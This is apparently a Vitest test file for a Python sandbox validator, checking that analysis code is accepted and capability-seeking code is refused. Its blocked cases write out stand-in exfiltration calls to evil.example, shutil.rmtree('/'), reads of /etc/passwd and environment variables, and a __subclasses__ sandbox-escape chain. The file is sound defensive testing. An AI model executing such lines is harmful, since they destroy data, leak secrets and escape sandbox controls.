// @vitest-environment node
import { beforeAll, describe, expect, it } from "vitest";
import { VALIDATOR_SOURCE } from "./sandbox/python-runtime.js";
import { HARNESS_INDEX_URL } from "./harness/node-sandbox.js";
import type { CodeViolation } from "./sandbox/pyodide-runtime.js";

const BOOT_MS = 120_000;

let validate: (code: string) => readonly CodeViolation[];

beforeAll(async () => {
  const { loadPyodide } = (await import("pyodide")) as unknown as {
    loadPyodide: (options: { indexURL: string; stdout: () => void; stderr: () => void }) => Promise<{ runPython(code: string): unknown }>;
  };
  const py = await loadPyodide({ indexURL: HARNESS_INDEX_URL, stdout: () => {}, stderr: () => {} });
  py.runPython(VALIDATOR_SOURCE);
  validate = (code: string) => JSON.parse(String(py.runPython(`__sa_validate(${JSON.stringify(code)})`))) as CodeViolation[];
}, BOOT_MS);

const codesOf = (code: string): readonly string[] => [...new Set(validate(code).map((v) => v.code))].sort();

describe("Stage 27.4 §6 — safe in-memory access is not a capability request", () => {
  const allowed: readonly (readonly [string, string])[] = [
    ["a dict literal", `RESULT = {}.get("x")`],
    ["a mapping built in the script", `mapping = {"a": 1}\nRESULT = mapping.get("a")`],
    ["the provided DataFrame", `RESULT = data.get("Jan")`],
    ["a Series taken from it", `column = data["Jan"]\nRESULT = column.get(0)`],
    ["a default-valued lookup", `cfg = {"k": 1}\nRESULT = cfg.get("k", 0)`],
    ["a counter inside a loop", `counts = {}\nfor name in numeric_columns:\n    counts[name] = counts.get(name, 0) + 1\nRESULT = counts`],
    ["a name that happens to spell a denied module", `types = {"a": 1}\nRESULT = types.get("a")`],
    ["a parameter that happens to spell a denied module", `def pick(io):\n    return io.get("x")\nRESULT = pick({"x": 1})`],
    ["a loop variable that happens to spell one", `for code in ["a"]:\n    RESULT = code.upper()`],
    ["an ordinary grouped aggregation", `grouped = data.groupby(entity_columns[0]).sum()\nRESULT = {"tables": {"g": grouped}}`],
    ["describe() serialised with to_dict", `RESULT = {"diagnostics": data.describe().to_dict()}`],
    ["a submodule imported from an allowed package", `from scipy import signal
peaks = signal.find_peaks(numeric_data.iloc[0].to_numpy())
RESULT = {"scalars": {"n": float(len(peaks[0]))}}`],
    ["an aliased submodule of an allowed package", `import scipy.stats as stats
RESULT = {"scalars": {"z": float(stats.zscore(numeric_data.iloc[0].to_numpy())[0])}}`],
    ["a dotted attribute chain on an allowed package", `import numpy as np
RESULT = {"scalars": {"n": float(np.random.default_rng(0).integers(1, 2))}}`],
    [
      "the analytical stack the sandbox ships",
      `import numpy as np\nfrom sklearn.cluster import KMeans\nx = numeric_data.fillna(0.0).to_numpy()\nRESULT = {"scalars": {"n": float(np.nansum(x))}}`,
    ],
  ];

  it.each(allowed)("accepts %s", (_label, code) => {
    expect(validate(code)).toEqual([]);
  });
});

describe("Stage 27.4 §6/§38 — a denied capability is refused whatever it is spelled", () => {
  const blocked: readonly (readonly [string, string, string])[] = [
    ["requests.get", `import requests\nrequests.get("https://evil.example")`, "NETWORK"],
    ["requests.get without a visible import", `requests.get("https://evil.example")`, "NETWORK"],
    ["requests.post", `requests.post("https://evil.example", data={})`, "NETWORK"],
    ["httpx.get", `httpx.get("https://evil.example")`, "NETWORK"],
    ["urllib.request.urlopen", `import urllib.request\nurllib.request.urlopen("https://evil.example")`, "NETWORK"],
    ["socket.socket", `import socket\nsocket.socket()`, "NETWORK"],
    ["an aliased requests module", `import requests as r\nr.get("https://evil.example")`, "NETWORK"],
    ["a bare name imported from requests", `from requests import get\nget("https://evil.example")`, "NETWORK"],
    ["os.system", `import os\nos.system("calc")`, "PROCESS"],
    ["os.system without a visible import", `os.system("calc")`, "PROCESS"],
    ["a bare name imported from os", `from os import system\nsystem("calc")`, "PROCESS"],
    ["os.environ read as data", `import os\nRESULT = dict(os.environ)`, "PROCESS"],
    ["subprocess.run", `import subprocess\nsubprocess.run(["ls"])`, "PROCESS"],
    ["subprocess.Popen", `subprocess.Popen(["ls"])`, "PROCESS"],
    ["pickle.loads", `import pickle\npickle.loads(b"")`, "PROCESS"],
    ["shutil.rmtree", `import shutil\nshutil.rmtree("/")`, "FILESYSTEM"],
    ["sqlite3.connect", `import sqlite3\nsqlite3.connect("x.db")`, "FILESYSTEM"],
    ["the JS bridge", `import js\njs.fetch("https://evil.example")`, "BRIDGE"],
    ["open()", `open("secret.txt")`, "CALL"],
    ["eval()", `eval("1 + 1")`, "CALL"],
    ["Path().read_text()", `from pathlib import Path\nPath("x").read_text()`, "IO"],
    ["Path().write_text()", `from pathlib import Path\nPath("x").write_text("y")`, "IO"],
    ["pandas reading a path", `import pandas as pd\npd.read_csv("/etc/passwd")`, "IO"],
    ["a DataFrame written to a path", `data.to_csv("/tmp/out.csv")`, "IO"],
    ["the subclasses escape chain", `().__class__.__bases__[0].__subclasses__()`, "ATTR"],
  ];

  it.each(blocked)("refuses %s as %s", (_label, code, capability) => {
    expect(codesOf(code)).toContain(capability);
  });
});

describe("Stage 27.4 §7 — workbook text stays data", () => {
  it("grants nothing when a cell value is pasted into the request", () => {
    expect(codesOf(`RESULT = {"scalars": {"n": float(len("requests.get(\\"https://evil\\")"))}}`)).toEqual([]);
  });

  it("still refuses the same text when it is executed instead of measured", () => {
    expect(codesOf(`requests.get("https://evil")`)).toContain("NETWORK");
  });
});

describe("Stage 27.4 §5 — the refusal names the capability, not the spelling", () => {
  it("reports the receiver it resolved, so a repair hint can be specific", () => {
    const violations = validate(`import requests as client\nclient.post("https://evil.example")`);
    const network = violations.find((v) => v.code === "NETWORK");
    expect(network?.detail).toBe("client.post");
  });

  it("no longer carries get or post as standalone denied method names", () => {
    expect(VALIDATOR_SOURCE).not.toMatch(/"request", "get", "post"/u);
    expect(VALIDATOR_SOURCE).toContain("_SA_V_CAPABILITY_MODULES");
    expect(VALIDATOR_SOURCE).toContain("_SA_V_IO_METHODS");
  });
});
